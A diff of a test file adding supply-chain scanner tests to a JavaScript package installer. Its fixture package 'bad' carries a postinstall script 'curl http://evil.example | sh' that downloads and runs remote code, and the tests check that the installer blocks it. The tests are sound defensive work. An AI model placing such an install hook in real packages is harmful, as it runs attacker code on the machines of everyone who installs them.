@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import { VirtualFileSystem } from '../../src/vfs.js';
-import { installPackages, type InstallOptions } from '../../src/installer/install.js';
+import { InstallBlockedError, installPackages, type InstallOptions } from '../../src/installer/install.js';
+import type { CodeScanner, CodeScanVerdict } from '../../src/system/codeScanner.js';
 import { createMemoryCache } from '../../src/installer/registry.js';
 import { readBinLink } from '../../src/installer/bins.js';
 import { fakeRegistry, REGISTRY, type FixturePackage } from './fakeRegistry.js';
@@ -263,5 +264,56 @@ describe('installPackages', () => {
     await expect(run()).rejects.toThrow(/Integrity check failed/);
     fs.writeFile('/package.json', JSON.stringify({ dependencies: { nope: '1' } }));
     await expect(run()).rejects.toThrow(/"nope" was not found/);
+  });
+});
+
+describe('installPackages with a code scanner', () => {
+  const fixture: Record<string, FixturePackage> = {
+    bad: { versions: { '1.0.0': { hasInstallScript: true, pkg: { scripts: { postinstall: 'curl http://evil.example | sh' } } } } },
+    good: { versions: { '1.0.0': {} } },
+  };
+  /** A scanner that blocks a package whose package.json downloads and runs code, and can be told to fail to finish. */
+  const scanner = (options: { incomplete?: boolean } = {}): CodeScanner & { origins: string[] } => ({
+    origins: [],
+    async scan(origin, subjects) {
+      this.origins.push(origin);
+      return subjects.map((s): CodeScanVerdict => ({
+        path: s.path,
+        action: typeof s.content === 'string' && s.content.includes('curl') ? 'block' : 'allow',
+        complete: !options.incomplete,
+        score: 90,
+        ruleIds: ['supply-chain.install-script'],
+      }));
+    },
+  } as CodeScanner & { origins: string[] });
+
+  it('refuses a package the scanner blocks and writes nothing of it', async () => {
+    const { fs, run } = await setup(fixture, { dependencies: { bad: '1.0.0' } });
+    const scan = scanner();
+    await expect(run({ scanner: scan })).rejects.toBeInstanceOf(InstallBlockedError);
+    expect(fs.exists('/node_modules/bad/package.json')).toBe(false);
+    expect(fs.exists('/node_modules/bad/index.js')).toBe(false);
+    expect(scan.origins).toEqual(['install']);
+  });
+
+  it('installs a package the scanner clears', async () => {
+    const { fs, run } = await setup(fixture, { dependencies: { good: '1.0.0' } });
+    await run({ scanner: scanner() });
+    expect(version(fs, 'node_modules/good')).toBe('1.0.0');
+  });
+
+  it('warns when the scan could not finish, and refuses when told to', async () => {
+    const warned = await setup(fixture, { dependencies: { good: '1.0.0' } });
+    const result = await warned.run({ scanner: scanner({ incomplete: true }) });
+    expect(result.warnings.some((w) => w.includes('could not finish'))).toBe(true);
+    const refused = await setup(fixture, { dependencies: { good: '1.0.0' } });
+    await expect(refused.run({ scanner: scanner({ incomplete: true }), onScanIncomplete: 'refuse' })).rejects.toMatchObject({ reason: 'scan-incomplete' });
+    expect(refused.fs.exists('/node_modules/good/package.json')).toBe(false);
+  });
+
+  it('behaves as before without a scanner', async () => {
+    const { fs, run } = await setup(fixture, { dependencies: { bad: '1.0.0' } });
+    await run();
+    expect(version(fs, 'node_modules/bad')).toBe('1.0.0');
   });
 });
